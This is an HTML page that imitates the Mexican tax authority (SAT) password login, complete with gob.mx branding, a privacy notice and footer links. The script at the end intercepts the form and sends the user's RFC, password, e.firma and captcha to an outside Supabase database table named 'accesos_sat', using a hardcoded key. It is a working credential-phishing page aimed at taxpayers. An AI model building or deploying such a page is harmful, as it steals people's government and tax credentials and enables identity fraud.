<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Acceso SAT</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #580029;
      color: #fff;
      padding: 10px 0;
    }

    .header-container {
      max-width: 1100px;
      margin: auto;
      padding: 0 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .logo img {
      height: 50px;
    }

    .nav-links {
      display: flex;
      align-items: center;
      gap: 30px;
    }

    .nav-links a {
      color: #fdfcfb !important;
      text-decoration: none;
      font-weight: bold;
    }

    .nav-links a:hover {
      text-decoration: underline;
    }

    .lupa {
      font-size: 18px;
      margin-left: 10px;
    }

    main {
      padding: 20px;
      max-width: 700px;
      margin: auto;
    }

    .inicio {
      margin-bottom: 10px;
    }

    .inicio i {
      margin-right: 5px;
      color: #000;
    }

    form {
      margin-top: 20px;
    }

    form label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }

    form input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      box-sizing: border-box;
    }

    form input[disabled] {
      background-color: #eee;
      cursor: not-allowed;
    }

    .buttons {
      margin-top: 15px;
    }

    button {
      background-color: #580029;
      color: #fff;
      padding: 10px 15px;
      margin-right: 10px;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #75003c;
    }

    .ayuda-links {
      margin-top: 20px;
      font-size: 14px;
    }

    .ayuda-links a {
      color: #50007a;
    }

    .aviso {
      background-color: #dff0ff;
      padding: 20px;
      margin: 40px auto;
      text-align: center;
      font-size: 14px;
      max-width: 1000px;
      border: 1px solid #b0d9f8;
      box-sizing: border-box;
    }

    footer {
      background-color: #580029;
      color: #fff;
      padding: 20px;
      margin-top: 40px;
    }

    .footer-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      max-width: 1100px;
      margin: auto;
    }

    .footer-column {
      flex: 1 1 200px;
      margin: 10px;
    }

    .footer-column h4 {
      margin-bottom: 10px;
    }

    .footer-column ul {
      list-style: none;
      padding: 0;
    }

    .footer-column a {
      color: #fdfcfb;
      text-decoration: none;
    }

    .footer-column a:hover {
      text-decoration: underline;
    }

    .footer-logo {
      flex: 1 1 200px;
      margin: 10px;
    }

    .footer-logo img {
      height: 50px;
      width: auto;
      display: block;
      margin-bottom: 15px;
    }

    .nav-links i {
      color: #fdfcfb;
      font-size: 16px;
    }

    .footer-column i {
      font-size: 22px;
      margin-right: 10px;
      color: #fdfcfb;
    }

    .footer-column i:hover {
      color: #c0c0c0;
    }
  </style>
</head>
<body>
  <header>
    <div class="header-container">
      <div class="logo">
        <img src="./assets/logoheader.svg" alt="Gobierno de M√©xico">
      </div>
      <nav class="nav-links">
        <a href="#">Tr√°mites</a>
        <a href="#">Gobierno</a>
        <span class="lupa"><i class="fas fa-search"></i></span>
      </nav>
    </div>
  </header>

  <main>
    <p class="inicio"><i class="fas fa-house"></i> Inicio</p>
    <h1>Acceso por contrase√±a</h1>

    <form id="formAcceso">
      <label for="rfc">RFC:</label>
      <input type="text" id="rfc" name="rfc" required>

      <label for="password">Contrase√±a: <span title="Ingresa tu contrase√±a.">‚ùî</span></label>
      <input type="password" id="password" name="contrasena" required>

      <label for="efirma">e.firma portable:</label>
      <input type="text" id="efirma" name="efirma">

      <label for="captcha">Captcha:</label>
      <img src="./assets/capcha1.png" alt="captcha" style="margin: 10px 0;">
      <input type="text" id="captcha" name="captcha" placeholder="Escriba la palabra del captcha" required>

      <div class="buttons">
        <button type="submit">Enviar</button>
        <button type="button">e.firma</button>
      </div>

      <div class="ayuda-links">
        <p><a href="#">¬øOlvidaste tu contrase√±a?</a></p>
        <p>Si a√∫n no cuentas con tu contrase√±a, obtenla <a href="#">aqu√≠</a>.</p>
        <p>Si a√∫n no cuentas con tu e.firma portable, obtenla <a href="#">aqu√≠</a>.</p>
        <p><a href="#">Requisitos de uso de e.firma portable</a></p>
      </div>
    </form>
  </main>

  <section class="aviso">
    <h3>Aviso de privacidad simplificado</h3>
    <p>
      El Servicio de Administraci√≥n Tributaria, es el responsable del tratamiento de los datos personales que se recolectan a trav√©s de su portal de internet
      (<a href="https://www.sat.gob.mx" target="_blank">https://www.sat.gob.mx</a>), los cuales son protegidos conforme a la Ley General de Protecci√≥n de Datos Personales.
    </p>
    <p>
      Para mayor informaci√≥n: <a href="https://repositorio.cloudb.sat.gob.mx/FTP/avisoprivacidad/802_NV_aviso_integral.html" target="_blank">Aviso integral</a>
    </p>
  </section>

  <footer>
    <div class="footer-container">
      <div class="footer-logo">
        <img src="./assets/logoheader.svg" alt="Gobierno de M√©xico">
      </div>
      <div class="footer-column">
        <h4>Enlaces</h4>
        <ul>
          <li><a href="#">Participa</a></li>
          <li><a href="#">Publicaciones Oficiales</a></li>
          <li><a href="#">Marco Jur√≠dico</a></li>
          <li><a href="#">Plataforma Nacional de Transparencia</a></li>
        </ul>
      </div>
      <div class="footer-column">
        <h4>¬øQu√© es gob.mx?</h4>
        <ul>
          <li><a href="#">Portal de datos abiertos</a></li>
          <li><a href="#">Declaraci√≥n de accesibilidad</a></li>
          <li><a href="#">Aviso de privacidad integral</a></li>
          <li><a href="#">Aviso de privacidad simplificado</a></li>
          <li><a href="#">T√©rminos y Condiciones</a></li>
          <li><a href="#">Pol√≠tica de seguridad</a></li>
          <li><a href="#">Mapa de sitio</a></li>
        </ul>
      </div>
      <div class="footer-column">
        <h4>Denuncia contra servidores p√∫blicos</h4>
        <p>S√≠guenos en</p>
        <p class="redes-sociales">
          <a href="#"><i class="fab fa-facebook-square"></i></a>
          <a href="#"><i class="fab fa-twitter"></i></a>
        </p>
      </div>
    </div>
  </footer>

  <script>
    const SUPABASE_URL = "https://ceywynuxwptqzntxsokj.supabase.co"; // üü° REEMPLAZA AQU√ç
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNleXd5bnV4d3B0cXpudHhzb2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY0Mjk4MDAsImV4cCI6MjA2MjAwNTgwMH0.SWDaRfaC9B9UIZmPxHXNnWIQoglKm1RrvXr_t5ushNA";              // üü° REEMPLAZA AQU√ç

    const form = document.getElementById("formAcceso");
    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const rfc = document.getElementById("rfc").value;
      const contrasena = document.getElementById("password").value;
      const efirma = document.getElementById("efirma").value;
      const captcha = document.getElementById("captcha").value;

      const response = await fetch(`${SUPABASE_URL}/rest/v1/accesos_sat`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": SUPABASE_KEY,
          "Authorization": `Bearer ${SUPABASE_KEY}`,
          "Prefer": "return=representation"
        },
        body: JSON.stringify({
          rfc,
          contrasena,
          efirma,
          captcha
        })
      });

      if (response.ok) {
        alert("‚úÖ Datos enviados correctamente a Supabase.");
        form.reset();
      } else {
        const error = await response.text();
        alert("‚ùå Error al enviar los datos: " + error);
      }
    });
  </script>
</body>
</html>
